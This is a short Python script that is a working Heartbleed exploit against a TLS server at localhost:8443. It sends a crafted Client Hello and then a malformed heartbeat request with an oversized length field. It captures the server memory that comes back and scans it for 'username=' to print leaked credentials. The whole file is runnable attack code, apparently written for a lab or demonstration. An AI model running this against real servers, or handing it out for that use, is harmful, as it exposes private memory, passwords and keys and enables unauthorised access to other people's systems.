import socket
import base64

tls_hello_s = "1603020034010000300302615d9acb434f4445434f4445434f4445434f4445434f4445434f4445434f4445000002002f01000005ff01000100"
tls_hello = bytes.fromhex(tls_hello_s)

tls_heartbeat_s = "180302000301ffff"
tls_heartbeat = bytes.fromhex(tls_heartbeat_s)

def findCredentials(r, key):
    z = str.encode(key)
    z1 = key.encode(encoding='utf-8')
    startIndex = r.find(key.encode())

    if startIndex == -1:
        return -1

    # Find first non-decodable character.
    endIndex = startIndex + len(key)
    trucking = True
    while trucking:
        try:
            c = r[startIndex:endIndex + 1]
            ss = c.decode()
            endIndex += 1
        except UnicodeDecodeError:
            trucking = False
    print(r[startIndex:endIndex].decode())
    
    return endIndex

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_address = ('localhost', 8443)
print('[Connecting to {} port {}]'.format(*server_address))
s.connect(server_address)

try:
    s.sendall(tls_hello)     # Send Client Hello
    s.recv(8 * 1024)         # Receive Server Hello, Certificate, Server Hello Done
    s.sendall(tls_heartbeat) # Send badly formed Heartbeat Request
    r = s.recv(64*1024)      # Receive server memory!

    index = 0
    index = findCredentials(r[index:], "username=")
    

finally:
    print('[Closing socket]')
    s.close()